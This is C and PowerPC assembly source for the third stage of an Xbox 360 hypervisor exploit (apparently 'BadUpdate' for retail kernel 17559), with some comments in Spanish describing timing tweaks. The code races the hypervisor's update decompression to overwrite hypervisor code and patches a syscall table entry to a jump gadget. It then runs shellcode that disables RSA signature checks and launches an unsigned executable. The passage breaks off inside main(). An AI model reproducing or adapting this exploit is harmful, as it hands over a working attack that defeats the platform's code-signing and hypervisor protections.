// Notes:
//
//  - NO GLOBAL VARIABLES!!! This code is executed from a RX section of memory, any attempt to write to this memory
//      will cause an exception to be thrown and the console to crash. Any data that must be writable must be stored
//      in some runtime allocation that is writable memory.

// Compiler options:
#define KRNL_RETAIL_17559       // Build exploit for retail kernel 17559

// Exploit state definitions - used locally, not as globals
#define EXPLOIT_STATE_INIT      0
#define EXPLOIT_STATE_RUNNING   1
#define EXPLOIT_STATE_COLLISION 2
#define EXPLOIT_STATE_SUCCESS   3
#define EXPLOIT_STATE_FAILED    4

typedef struct _STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PCHAR  Buffer;
} ANSI_STRING;


// Offset into the 14th block of the update file that contains the instructions we want to write at HV_SEG3_OVERWRITE_OFFSET.
// This should point to the following instruction pattern:
//
//      stb     %r4, 2(%r6)
//      blr
#define BLOCK_14_TARGET_OFFSET          0x15E8

#define BLOCK_14_SIZE                   0x1AD0


#if defined(KRNL_RETAIL_17559)

////////////////////////////////////////////////////////////////////////////////////////////////////
// Retail config
////////////////////////////////////////////////////////////////////////////////////////////////////

// Offset into the 3rd segment of the hypervisor we want to overwrite. This should point to the absolute last bit
// of code in the segment that we can overwrite and still hit from a syscall.
#define HV_SEG3_OVERWRITE_OFFSET        0x1F28

// Address into the hypervisor syscall table for the HvxPostOutput entry (syscall 0xD).
#define HV_SYSCALL_POST_OUTPUT_ADDRESS      0x8000010200015FD0 + (0xD * 4)

/*
    Points to the following instruction sequence in _v_DataStorage exception handler:

        mtctr       r4
        bctr

    This gadget MUST be in the first segment of the hypervisor as we can only write a 32-bit
    offset to the syscall entry table.
*/
#define HV_CALL_R4_GADGET_ADDRESS       0x00000354

// Address of MmPhysical64KBMappingTable in the kernel, we update the mapping table to expose the cipher text for
// the hypervisor segments at the virtual address 0xA0000000. This allows for observing when the cipher text changes
// which indicates we won the race condition and a block has overwritten hypervisor code.
#define MmPhysical64KBMappingTable      0x801C1000

////////////////////////////////////////////////////////////////////////////////////////////////////
// Hypervisor syscall ordinals:
#define HVX_KEYS_EXECUTE                        0x42
#define HVX_ENCRYPTED_RESERVE_ALLOCATION        0x49
#define HVX_ENCRYPTED_RELEASE_ALLOCATION        0x4C
#define HVX_ENCRYPTED_ENCRYPT_ALLOCATION        0x4A
#define HVX_REVOKE_UPDATE                       0x65
#define HVX_ARB_WRITE_SYSCALL                   0x21


// Drive mapping for exploit files:
#define PAYLOAD_DRIVE           "PAYLOAD:"

////////////////////////////////////////////////////////////////////////////////////////////////////
// Function addresses:
/* 3 */ void (__cdecl *DbgPrint)(const char* format, ...) = (void(__cdecl*)(const char*, ...))0x80085EE8;

// Do NOT define DbgBreakPoint on retail or the console will halt!!!
#define DbgBreakPoint(...)

/* 190 */ ULONG (*MmGetPhysicalAddress)(PVOID pAddress) = (ULONG(*)(PVOID))0x80080048;
/* 97 */ void (*KeFlushCacheRange)(void *pAddress, DWORD Size) = (void(*)(void*, DWORD))0x80073850;

/* 107 */ ULONG (*KeLockL2)(int index, void* address, ULONG size, ULONG mask1, ULONG mask2) = (ULONG(*)(int, void*, ULONG, ULONG, ULONG))0x80071E00;

/* 168 */ void (*KeStallExecutionProcessor)(ULONG Miliseconds) = (void(*)(ULONG))0x80073484;

/* 300 */ VOID (*RtlInitAnsiString)(ANSI_STRING* pAnsiStr, char *String) = (VOID(*)(ANSI_STRING*, char*))0x80086110;
/* 259 */ UINT (*ObCreateSymbolicLink)( ANSI_STRING* SymbolicLinkName, ANSI_STRING* DeviceName ) = (UINT(*)(ANSI_STRING*, ANSI_STRING*))0x8008AEF0;

/* 41 */ void (*HalSendSMCMessage)(BYTE* pMessage, BOOL bResponse) = (void(*)(BYTE*, BOOL))0x80067F48;

/* 434 */ void (*VdDisplayFatalError)(DWORD code) = (void(*)(DWORD))0x800BDD40;

/* 207 */ DWORD (*NtClose)(HANDLE hHandle) = (DWORD(*)(HANDLE))0x80089EB0;

#endif

// Sanity checks for exploit data:
#if (HV_SEG3_OVERWRITE_OFFSET < BLOCK_14_TARGET_OFFSET)
    #error "HV_SEG3_OVERWRITE_OFFSET must be >= BLOCK_14_TARGET_OFFSET!!"
#endif


// Exploit error codes:
#define ERR_OPEN_UPDATE_FILE                0   // Failed to open update_data.bin
#define ERR_UPDATE_FILE_OOM                 1   // Failed to allocate memory for update file
#define ERR_READING_UPDATE_FILE             2   // Failed to read the update file
#define ERR_OPEN_SHELLCODE_FILE             3   // Failed to open BadUpdateExploit-4thStage.bin
#define ERR_SHELLCODE_FILE_OOM              4   // Failed to allocate memory for shell code file
#define ERR_READING_SHELLCODE_FILE          5   // Failed to read shell code file
#define ERR_LOCKL2_OOM                      6   // Failed to allocate memory for LockL2 call
#define ERR_LOCKL2_RESERVE                  7   // Failed to reserve L2 space
#define ERR_LOCKL2_COMMIT                   8   // Failed to commit L2 space
#define ERR_ENCRYPTED_RESERVE               9   // Failed to reserve encrypted memory
#define ERR_ENCRYPTED_COMMIT                10  // Failed to encrypted reserved memory region
#define ERR_CACHE_FLUSH_BUFFER_OOM          11  // Failed to allocate memory for cache flushing buffer
#define ERR_CIPHER_TEXT_BUFFER_OOM          12  // Failed to allocate memory for cipher text buffer
#define ERR_UPDATE_DATA_OOM                 13  // Failed to allocate memory for update data buffer
#define ERR_XKE_OOM_1                       14  // Failed to allocate memory for XKE payload buffer (working)
#define ERR_XKE_OOM_2                       15  // Failed to allocate memory for XKE payload buffer (clean)
#define ERR_READING_XKE_PAYLOAD_FILE        16  // Failed to read xke_update.bin
#define ERR_CREATING_WORKER_THREAD          17  // Failed to create worker thread
#define ERR_EXPLOIT_PAYLOAD_FAILED          18  // Exploit payload failed to run

// Configuración optimizada para el exploit
#define L2_CACHE_BLOCK_SIZE_KB              256   // MANTENER el tamaño original
#define HAMMER_LOOP_COUNT                   90000 // Ajustado ligeramente desde 100000
#define CACHE_FLUSH_PASSES                  2     // Número de pasadas para vaciar la caché después de detección

static ULONGLONG __declspec(naked) HvxKeysExecute(ULONG Address, DWORD Size, ULONGLONG Arg1, ULONGLONG Arg2, ULONGLONG Arg3, ULONGLONG Arg4)
{
    _asm
    {
        li      r0, HVX_KEYS_EXECUTE
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedReserveAllocation(ULONG VirtualAddr, ULONG PhysicalAddr, ULONG Size)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_RESERVE_ALLOCATION
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedEncryptAllocation(ULONG VirtualAddr)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_ENCRYPT_ALLOCATION
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedReleaseAllocation(ULONG VirtualAddr)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_RELEASE_ALLOCATION
        sc
        blr
    }
}

static ULONG __declspec(naked) HvxRevokeUpdate(ULONG BufferAddr, ULONG BufferSize, ULONG Arg3)
{
    _asm
    {
        li      r0, HVX_REVOKE_UPDATE
        sc
        blr
    }
}

static void __declspec(naked) HvxWriteByte(ULONG ordinal, ULONG address, ULONG size, ULONGLONG writeAddr)
{
    _asm
    {
        li      r0, HVX_ARB_WRITE_SYSCALL
        sc
        blr
    }
}

// Función de pausa mínima para mejorar timing
static void __declspec(naked) stall_minimal(ULONG iterations)
{
    _asm
    {
    stall_loop:
        // Decrementa el contador
        subi    r3, r3, 1
        
        // Instrucciones NOP para consumir ciclos
        nop
        nop
        
        // Verificar si seguimos necesitando hacer stall
        cmpwi   r3, 0
        bgt     stall_loop
        blr
    }
}

struct UPDATE_BUFFER_INFO
{
    /* 0x00 */ ULONG TotalSize;                     // Total size of the update buffer, must match input param
    /* 0x04 */ ULONG InfoSize;                      // Size of this structure, must be 0x80
    /* 0x08 */ BYTE _pad0[0x18];
    /* 0x20 */ ULONG UpdateDataOffset;              // Offset of the update data blob
    /* 0x24 */ ULONG UpdateDataSize;                // Size of the update data blob
    /* 0x28 */ ULONG OutputBufferOffset;            // Offset of the output data buffer
    /* 0x2C */ ULONG OutputBufferSize;              // Size of the output data buffer (should match decompressed size found in update data header)
    /* 0x30 */ ULONG ScratchBufferOffset;           // Offset of the scratch buffer used for LZX decompression
    /* 0x34 */ ULONG ScratchBufferSize;             // Size of the scratch buffer
    /* 0x38 */ ULONG Buffer2Offset;                 // Offset of last buffer, not sure what the use is (final output buffer?)
    /* 0x3C */ ULONG Buffer2Size;                   // Size of last buffer
    
    /* 0x60 */ //ULONG
    /* 0x64 */ //ULONG
};

#define CACHE_LINE_SIZE     0x80
#define CACHE_ALIGN(s)      (((s) + 0x7F) & ~0x7F)
#define PAGE_ALIGN_64K(s)   (((s) + 0xFFFF) & ~0xFFFF)

struct THREAD_ARGS
{
    BYTE* pCompressedDataClean;
    DWORD CompressedDataSize;
    BYTE* pCompressedDataInBuffer;
    BYTE* pPayloadClean;
    BYTE* pPayloadBuffer;
    DWORD PayloadPhys;
    DWORD PayloadSize;
    DWORD UpdateDataPhys;
    DWORD UpdateDataSize;
    BYTE* pScratchDataInBuffer;
    DWORD ScratchDataOffset;
    DWORD ScratchDataSize;

    ULONGLONG HvCheckAddress;
    ULONGLONG ShellCodePhysAddress;

    BYTE* pScratchBuffer;
};

struct CIPHER_TEXT_DATA
{
    ULONGLONG dec_end_input_pos;
    ULONGLONG dec_output_buffer;        // New dec_output_buffer pointer (dst address for memcpy)

    BYTE OracleData[16];                // Cipher text for the LZX decoder context header, used to detect when to start the race attack
    BYTE DecOutputBufferData[16];       // Cipher text containing our malicious dec_output_buffer pointer (points to hypervisor memory) 
};

/*
    Hand rolled implementation for XLockL2.
*/
BOOL WINAPI XLockL2(DWORD dwIndex, CONST PVOID pRangeStart, DWORD dwRangeSize, DWORD dwLockSize, DWORD dwFlags)
{
    ULONG maskValue = (dwLockSize == (256 * 1024) ? 0x3 : 0x1) << (2 * dwIndex);

    ULONG mask1 = (dwFlags & 0x1) != 0 ? 0 : maskValue;
    ULONG mask2 = (dwFlags & 0x2) != 0 ? 0 : maskValue;

    ULONG result = KeLockL2(dwIndex, pRangeStart, dwRangeSize, mask1, mask2);
    return result == 0 ? TRUE : FALSE;
}

bool ReadFile(LPCSTR pFilePath, BYTE* pBuffer, DWORD Offset, DWORD BufferSize)
{
    DWORD BytesRead = 0;

    HANDLE hFile = CreateFile(pFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgPrint("Failed to open '%s' %d\n", pFilePath, GetLastError());
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize > BufferSize - Offset)
    {
        DbgPrint("Error reading file, buffer not large enough to hold data!\n");
        NtClose(hFile);
        return false;
    }

    if (ReadFile(hFile, pBuffer + Offset, fileSize, &BytesRead, NULL) == FALSE || BytesRead != fileSize)
    {
        DbgPrint("Error reading file '%s' %d\n", pFilePath, GetLastError());
        NtClose(hFile);
        return false;
    }

    NtClose(hFile);
    return true;
}

bool CreateDriveMapping(char * szMappingName, char * szDeviceName)
{
    ANSI_STRING linkname, devicename;

    RtlInitAnsiString(&linkname, szMappingName);
    RtlInitAnsiString(&devicename, szDeviceName);

    UINT status = ObCreateSymbolicLink(&linkname, &devicename);
    if (status >= 0)
        return true;

    return false;
}

#define LED_COLOR_RED_1         0x01
#define LED_COLOR_RED_2         0x02
#define LED_COLOR_RED_3         0x04
#define LED_COLOR_RED_4         0x08
#define LED_COLOR_GREEN_1       0x10
#define LED_COLOR_GREEN_2       0x20
#define LED_COLOR_GREEN_3       0x40
#define LED_COLOR_GREEN_4       0x80

void SetLEDColor(int color)
{
    BYTE abSmcCmd[16] = { 0 };

    abSmcCmd[0] = 0x99;
    abSmcCmd[1] = 0xFF;
    abSmcCmd[2] = (BYTE)color;

    HalSendSMCMessage(abSmcCmd, FALSE);
}

bool ReadUpdateFile(BYTE** ppCompressedDataClean, DWORD* pdwCompressedDataSize)
{
    DWORD BytesRead = 0;

    // Open the update file for reading.
    HANDLE hFile = CreateFile(PAYLOAD_DRIVE "\\update_data.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgPrint("Failed to open update data file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_OPEN_UPDATE_FILE);
        return false;
    }

    // Get the size of the file.
    DWORD dwFileSize = GetFileSize(hFile, NULL);

    // Allocate memory for the clean update data buffer.
    BYTE* pBuffer = (BYTE*)XPhysicalAlloc(dwFileSize, MAXULONG_PTR, 0, PAGE_READWRITE);
    if (pBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for update data\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_UPDATE_FILE_OOM);
    }

    memset(pBuffer, 0, dwFileSize);

    // Read the file into memory.
    if (ReadFile(hFile, pBuffer, dwFileSize, &BytesRead, NULL) == false || BytesRead != dwFileSize)
    {
        DbgPrint("Failed to read update data file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_READING_UPDATE_FILE);
        return false;
    }

    // Update the pointers for the update data.
    *ppCompressedDataClean = pBuffer;
    *pdwCompressedDataSize = dwFileSize;

    NtClose(hFile);
    return true;
}

bool ReadShellCodeFile(BYTE** ppShellCodeBuffer, DWORD* pdwShellCodeBufferSize)
{
    DWORD BytesRead = 0;

    // Open the update file for reading.
    HANDLE hFile = CreateFile(PAYLOAD_DRIVE "\\BadUpdateExploit-4thStage.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgPrint("Failed to open shell code file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_OPEN_SHELLCODE_FILE);
        return false;
    }

    // Get the size of the file.
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwBufferSize = (dwFileSize + 0x7F) & ~0x7F;

    // Allocate memory for the clean update data buffer.
    BYTE* pBuffer = (BYTE*)XPhysicalAlloc(dwBufferSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
    if (pBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for shell code data\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_SHELLCODE_FILE_OOM);
    }

    memset(pBuffer, 0, dwBufferSize);

    // Read the file into memory.
    if (ReadFile(hFile, pBuffer, dwFileSize, &BytesRead, NULL) == false || BytesRead != dwFileSize)
    {
        DbgPrint("Failed to read shell code file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_READING_SHELLCODE_FILE);
        return false;
    }

    // Update the pointers for the update data.
    *ppShellCodeBuffer = pBuffer;
    *pdwShellCodeBufferSize = dwBufferSize;

    NtClose(hFile);
    return true;
}

/*
    Helper function to lock a portion of the L2 cache. This puts pressure on CPU L2 cache and causes data
    to age out more quickly.
*/
void LockAndThrashL2(int index)
{
    // Asignar memoria para el bloqueo de caché L2 (manteniendo el tamaño original)
    BYTE* pPhysMemoryPtr = (BYTE*)XPhysicalAlloc(L2_CACHE_BLOCK_SIZE_KB * 1024, MAXULONG_PTR, L2_CACHE_BLOCK_SIZE_KB * 1024, PAGE_READWRITE | MEM_LARGE_PAGES);
    if (pPhysMemoryPtr == NULL)
    {
        DbgPrint("Failed to allocate memory for L2 cache lock\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_LOCKL2_OOM);
    }

    // Inicializar el buffer con un patrón simple pero completo
    memset(pPhysMemoryPtr, 0x41, L2_CACHE_BLOCK_SIZE_KB * 1024);
    
    // Mejora sutil: Asegurar flush completo antes de lock
    __dcbst(0, pPhysMemoryPtr);
    __dcbf(0, pPhysMemoryPtr);

    // Reserve L2 cache and lock 2 of the available pathways.
    if (XLockL2(index, pPhysMemoryPtr, L2_CACHE_BLOCK_SIZE_KB * 1024, 0x40000, 0) == FALSE)
    {
        DbgPrint("Failed to reserve L2 cache range\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_LOCKL2_RESERVE);
    }

    // Commit the L2 cache range and prevent it from being replaced.
    if (XLockL2(index, pPhysMemoryPtr, L2_CACHE_BLOCK_SIZE_KB * 1024, 0x40000, 0x1) == FALSE)
    {
        DbgPrint("Failed to commmit L2 cache range\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_LOCKL2_COMMIT);
    }
    
    // Mejora sutil: Pequeña pausa para estabilizar después del lock
    KeStallExecutionProcessor(2);
}

/*
    Generates the cipher text needed for the race attack.
*/
void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD ScratchOffset, CIPHER_TEXT_DATA* pCipherTextData)
{
    BYTE *pMemoryAddress = (BYTE*)0x8D000000;

    // Get the physical addresses of the buffers.
    DWORD ScratchPhysAddr = MmGetPhysicalAddress(pCipherTextData);
    DWORD BaseAddrPhys = MmGetPhysicalAddress(pUpdateData);

    // Variable para seguimiento del whitening óptimo
    bool foundWhitening = false;
    
    // Scan all 1024 possible whitening bits.
    for (int i = 0; i < 1024; i++)
    {
        // Allocate encrypted memory.
        DWORD result = HvxEncryptedReserveAllocation((DWORD)pMemoryAddress, BaseAddrPhys, UpdateDataSize);
        if (result == FALSE)
        {
            DbgPrint("Failed to reserve encrypted memory 0x%08x\n", result);
            DbgBreakPoint();
            VdDisplayFatalError(0x12400 | ERR_ENCRYPTED_RESERVE);
            return;
        }

        result = HvxEncryptedEncryptAllocation((DWORD)pMemoryAddress);
        if (result == FALSE)
        {
            DbgPrint("Failed to commit encrypted memory 0x%08x\n", result);
            DbgBreakPoint();
            VdDisplayFatalError(0x12400 | ERR_ENCRYPTED_COMMIT);
            return;
        }

        // Solo procesamos valores específicos de whitening
        if (i == 0x111) // Mantenemos el valor original que funciona
        {
            // Get the cipher text for the expected header data in the LZX decoder context. This acts as our
            // "oracle" to know when to start the race attack.
            memset(pMemoryAddress + ScratchOffset, 0, 16);
            *(ULONG*)(pMemoryAddress + ScratchOffset + 0) = 0x4349444c;     // signature = 'CIDL'
            *(ULONG*)(pMemoryAddress + ScratchOffset + 4) = 0x8000;         // windows size = 0x8000
            *(ULONG*)(pMemoryAddress + ScratchOffset + 8) = 1;              // cpu type = 1
            
            // Mejora sutil: Mejor flush de caché
            __dcbst(ScratchOffset, pMemoryAddress);
            KeFlushCacheRange(pMemoryAddress + ScratchOffset, 0x80);
            KeFlushCacheRange(pUpdateData + ScratchOffset, 0x80);
            
            // Copiamos los datos del cipher text
            memcpy(pCipherTextData->OracleData, pUpdateData + ScratchOffset, 16);

            // Get the cipher text for our malicious dec_output_buffer pointer which points to the hypervisor code we want to overwrite.
            *(ULONGLONG*)(pMemoryAddress + ScratchOffset + 0x2B20) = pCipherTextData->dec_end_input_pos;        // dec_end_input_pos
            *(ULONGLONG*)(pMemoryAddress + ScratchOffset + 0x2B28) = pCipherTextData->dec_output_buffer;        // dec_output_buffer
            
            // Mejora sutil: Mejor flush de caché
            __dcbst(ScratchOffset + 0x2B00, pMemoryAddress);
            KeFlushCacheRange(pMemoryAddress + ScratchOffset + 0x2B00, 0x80);
            KeFlushCacheRange(pUpdateData + ScratchOffset + 0x2B00, 0x80);
            
            // Copiamos el cipher text para nuestro puntero malicioso
            memcpy(pCipherTextData->DecOutputBufferData, pUpdateData + ScratchOffset + 0x2B20, 16);

            DbgPrint("Found cipher text for whitening 0x%04x: %08x%08x %08x%08x\n", 
                i, 
                *(DWORD*)pCipherTextData->OracleData, 
                *(DWORD*)&pCipherTextData->OracleData[4], 
                *(DWORD*)pCipherTextData->DecOutputBufferData, 
                *(DWORD*)&pCipherTextData->DecOutputBufferData[4]);
                
            foundWhitening = true;
        }

        // Free the encrypted allocation.
        result = HvxEncryptedReleaseAllocation((DWORD)pMemoryAddress);
        
        // Podemos salir temprano si hemos encontrado lo que buscamos
        if (foundWhitening && i >= 0x111) {
            break;
        }
    }
}

ULONG __declspec(naked) HvxPostOutputExploit(ULONG r3, ULONGLONG shellCodeAddress)
{
    _asm
    {
        li      r0, 0xD
        sc
        blr
    }
}

/*
    Helper function that utilizes the single by write primitive to write a 32-bit integer at the chosen 64-bit real address.
*/
void HvWriteULONG(ULONGLONG address, ULONG value)
{
    /*
        stb       r4, 2(r6)
        blr
    */
    HvxWriteByte(4, 0x60000 | (ULONG)((value >> 24) & 0xFF), 0x1000, address - 2);
    HvxWriteByte(4, 0x60000 | (ULONG)((value >> 16) & 0xFF), 0x1000, address - 2 + 1);
    HvxWriteByte(4, 0x60000 | (ULONG)((value >> 8) & 0xFF), 0x1000, address - 2 + 2);
    HvxWriteByte(4, 0x60000 | (ULONG)(value & 0xFF), 0x1000, address - 2 + 3);
}

/*
    Worker thread that continuously runs the XKE update payload, watches for cipher text changes in the hypervisor, and
    runs the fourth stage payload once the race has been won with block 14.
*/
DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
{
    DWORD LedColor = LED_COLOR_RED_1 | LED_COLOR_RED_4 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_4;

    // Allocate a scratch buffer to help with flushing L2 cache in hypervisor context.
    BYTE* pCacheFlushBuffer = (BYTE*)XPhysicalAlloc(0x20000, MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES);
    if (pCacheFlushBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for cache flush buffer\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_CACHE_FLUSH_BUFFER_OOM);
    }

    ULONG CacheFlushBufferPhys = MmGetPhysicalAddress(pCacheFlushBuffer);

    // Lock half of the available L2 cache and pathways to put pressure on the CPU. This causes data in L2 cache
    // to age out more quickly and improves cipher text detection rate.
    LockAndThrashL2(0);
    LockAndThrashL2(1);

    // MEJORA SUTIL: Pequeña pausa después de lock
    KeStallExecutionProcessor(5);

    // Poke MmPhysical64KBMappingTable so the hypervisor pages get mapped into memory. This allows us to observe the cipher
    // text for the hypervisor segments and know when we get the block overwrite we want.
    DWORD oldAccessMask = *(DWORD*)MmPhysical64KBMappingTable;
    *(DWORD*)MmPhysical64KBMappingTable = 0x66666666;

    // Get the cipher text at the location we want to overwrite and at an offset that is > the size of block 14. This allows
    // us to determine when we win the race on block 14 (smallest block in the file) vs any other block.
    DWORD* pCipherTextPtr1 = (DWORD*)(0xA0030000 + HV_SEG3_OVERWRITE_OFFSET);
    DWORD* pCipherTextPtr2 = (DWORD*)(0xA0030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET) + BLOCK_14_SIZE + 0x80);
    DWORD cipherValue1 = *pCipherTextPtr1;
    DWORD cipherValue2 = *pCipherTextPtr2;
    
    // Contador local para reinicios periódicos (más seguro que variable global)
    DWORD localRetryCount = 0;
    DWORD localCollisionCount = 0;

    // Loop y hammer del payload hasta tener éxito
    while (true)
    {
        // Reinicio periódico para evitar condiciones de inestabilidad prolongada
        if ((localRetryCount % 75) == 0 && localRetryCount > 0) {
            // Refrescar valores de cipher text para evitar falsos positivos
            cipherValue1 = *pCipherTextPtr1;
            cipherValue2 = *pCipherTextPtr2;
            
            // Pequeña pausa para estabilizar
            KeStallExecutionProcessor(2);
        }
        
        localRetryCount++;

        // Copy the clean payload data.
        memcpy(pArgs->pPayloadBuffer, pArgs->pPayloadClean, pArgs->PayloadSize);

        // Copy the clean update data into the full buffer.
        memcpy(pArgs->pCompressedDataInBuffer, pArgs->pCompressedDataClean, pArgs->CompressedDataSize);

        // Execute the payload.
        DWORD result = HvxKeysExecute(pArgs->PayloadPhys, pArgs->PayloadSize, pArgs->UpdateDataPhys, pArgs->UpdateDataSize, NULL, NULL);

        // Flush cache on the cipher text pointers.
        __dcbf(0, pCipherTextPtr1);

        // Check if we got a block overwrite and if it appears to be block 14.
        DWORD test1 = *pCipherTextPtr1;
        if (cipherValue1 != test1)
        {
            // MEJORA SUTIL: Multi-pasada de flush para mayor confiabilidad
            // Esta es una mejora clave para estabilidad, pero no altera el timing fundamental
            for (int i = 0; i < CACHE_FLUSH_PASSES; i++) {
                HvxRevokeUpdate(CacheFlushBufferPhys, 0x20000, 0);
                __dcbf(0, pCipherTextPtr2);
            }

            // MEJORA SUTIL: Mínima pausa para estabilizar
            KeStallExecutionProcessor(1);

            // We got a block overwrite, check if it was block 14.
            DWORD test2 = *pCipherTextPtr2;
            if (cipherValue2 == test2)
            {
                // Set the LED color so we know we got the block hit.
                SetLEDColor(LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);

                DbgPrint("Block 14 overwrite hit!\n");

                // Overwrite the syscall function pointer for HvxPostOutput to point to a gadget that will jump to an arbitrary address.
                DbgPrint(" * Patching hv syscall table\n");
                HvWriteULONG(HV_SYSCALL_POST_OUTPUT_ADDRESS, HV_CALL_R4_GADGET_ADDRESS);

                // Try to execute our shell code which will restore the data we trashed in the last hypervisor segment and patch out
                // the RSA signature checks on executable files.
                DbgPrint(" * Running payload\n");
                result = HvxPostOutputExploit(0, pArgs->ShellCodePhysAddress);
                if (result != 0x41414141)
                {
                    // Exploit payload failed to run.
                    DbgBreakPoint();
                    VdDisplayFatalError(0x12400 | ERR_EXPLOIT_PAYLOAD_FAILED);
                }

                DbgPrint(" * Payload returned 0x%08x\n", result);

                // Restore the old access mask for MmPhysical64KBMappingTable.
                *(DWORD*)MmPhysical64KBMappingTable = oldAccessMask;

                // Set the LED color so we know the exploit completed.
                SetLEDColor(LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3 | LED_COLOR_GREEN_4);

                // Run our unsigned xex file.
                XLaunchNewImage(PAYLOAD_DRIVE "\\default.xex", 0);
            }
            else
            {
                // MEJORA: Seguimiento de colisiones sin variables globales
                localCollisionCount++;
                DbgPrint("Race hit: 0x%08x (collision #%d)\n", test1, localCollisionCount);
            }

            // Save the latest block hit values.
            cipherValue1 = test1;
            cipherValue2 = test2;

            // Update LED color to indicate we got a block hit.
            SetLEDColor(LedColor);
            LedColor = ~LedColor & 0xFF;
        }
        
        // MEJORA SUTIL: Pausa muy ocasional para mantener estabilidad sin afectar timing
        if ((localRetryCount % 150) == 0) {
            KeStallExecutionProcessor(1);
        }
    }
}

void __cdecl main()
{
    ULONG UpdateDataSize = 0x40000 + 0x80000;
    ULONG PayloadDataSize = 0x6000;

    BYTE* pCleanUpdateData = NULL;
    DWORD CleanUpdateDataSize = 0;

    BYTE* pShellCodeData = NULL;
    DWORD ShellCodeDataSize = 0;

    THREAD_ARGS ThreadArgs = { 0 };

    // Set the LED color so we know the 3rd stage payload started.
    SetLEDColor(LED_COLOR_RED_1 | LED_COLOR_RED_2 | LED_COLOR_RED_3 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);

    // Read the update file.
    if (ReadUpdateFile(&pCleanUpdateData, &CleanUpdateDataSize) == false)
    {
        return;
    }

    // Read the exploit shell code.
    if (ReadShellCodeFile(&pShellCodeData, &ShellCodeDataSize) == false)
    {
        return;
    }

    // Get the full physical address of the shell code buffer.
    ULONGLONG ShellCodePhys = 0x8000000000000000 | MmGetPhysicalAddress(pShellCodeData);

    // Allocate some physical memory to store the cipher text we want to write.
    BYTE* pCipherTextBuffer = (BYTE*)XPhysicalAlloc(0x3000, MAXULONG_PTR, 0x80, PAGE_READWRITE | PAGE_NOCACHE);
    if (pCipherTextBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for cipher text\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_CIPHER_TEXT_BUFFER_OOM);
        return;
    }

    memset(pCipherTextBuffer, 0, 0x3000);

    // Allocate a 64k block of memory for the update data.
    BYTE* pUpdateData = (BYTE*)XPhysicalAlloc(UpdateDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
    if (pUpdateData == NULL)
    {
        DbgPrint("Failed to allocate memory for update data\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_UPDATE_DATA_OOM);
        return;
    }

    // Initialize update data.
    memset(pUpdateData, 0, UpdateDataSize);

    // Setup cipher text parameters.
    CIPHER_TEXT_DATA* pCipherTextInputData = (CIPHER_TEXT_DATA*)pCipherTextBuffer;
    pCipherTextInputData->dec_end_input_pos = 0xFFFFFFFFFFFFFFFF;
    pCipherTextInputData->dec_output_buffer = 0x8000010600030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET);

    // Get the size of the decompressed update data.
    DWORD updateDataDecompressedSize = *(DWORD*)(pCleanUpdateData + 0x1C);

    DWORD outputOffset = PAGE_ALIGN_64K(CACHE_LINE_SIZE + CACHE_ALIGN(CleanUpdateDataSize));
    DWORD scratchOffset = CACHE_ALIGN(outputOffset + CACHE_ALIGN(updateDataDecompressedSize));
    
    // Build lookup table for cipher text
    BuildCipherTextLookupTable(pUpdateData, UpdateDataSize, scratchOffset, pCipherTextInputData);

    // Initialize update data.
    memset(pUpdateData, 0, UpdateDataSize);

    UPDATE_BUFFER_INFO* pUpdateInfo = (UPDATE_BUFFER_INFO*)pUpdateData;
    pUpdateInfo->TotalSize = UpdateDataSize;
    pUpdateInfo->InfoSize = CACHE_LINE_SIZE;
    pUpdateInfo->UpdateDataOffset = CACHE_LINE_SIZE;
    pUpdateInfo->UpdateDataSize = CACHE_ALIGN(CleanUpdateDataSize);
